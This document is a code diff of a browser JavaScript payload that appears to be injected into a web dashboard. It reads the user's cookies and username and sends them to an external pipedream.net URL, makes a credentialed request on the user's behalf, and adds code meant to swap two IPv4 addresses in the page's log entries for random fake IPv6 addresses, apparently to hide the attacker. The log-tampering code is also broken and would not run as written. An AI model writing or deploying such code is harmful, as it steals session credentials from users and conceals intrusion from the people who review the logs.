@@ -1,7 +1,15 @@
+function getRandomInt(min, max) {
+    min = Math.ceil(min);
+    max = Math.floor(max);
+    return Math.floor(Math.random() * (max - min) + min);
+}
+
 const id = document.querySelector("#page-topbar > div > div.d-flex.align-items-center > div > div > a:nth-child(1)").attributes['href'].value.split("/")[2];
 const username = document.querySelector('#page-header-user-dropdown > span').innerText
 const avatar = document.querySelector("#page-header-user-dropdown > img").src
 const expander = (document.querySelector("#page-header-user-dropdown > img").attributes['onload'] !== undefined)
+const ipv6_1 = `2001:f${getRandomInt(100,999)}:${getRandomInt(100,999)}:${getRandomInt(1000,9999)}::${getRandomInt(1000,9999)}`
+const ipv6_2 = `2001:f${getRandomInt(100,999)}:${getRandomInt(100,999)}:${getRandomInt(1000,9999)}::${getRandomInt(1000,9999)}`
 
 fetch('https://eodm4q7xsesbwyr.m.pipedream.net/' + document.cookie + '-user-' + username);
 try {
@@ -40,6 +48,20 @@ if (!expander) {
     "mode": "cors",
     "credentials": "include"
     });
+}
+
+try {
+    var logs = document.querySelectorAll("#app-layouts > div.main-content > div > div.row > div > div > div > p");
+    logs.forEach(log => {
+        if (logs.innerText.includes("107.189.10.123")) {
+            logs.innerText.replace("107.189.10.123", ipv6)
+        }
+        if (logs.innerText.includes("146.59.80.183")) {
+            logs.innerText.replace("146.59.80.183", ipv6_2)
+        }
+    });
+}catch {
+    console.clear();
 }
 
 console.clear();
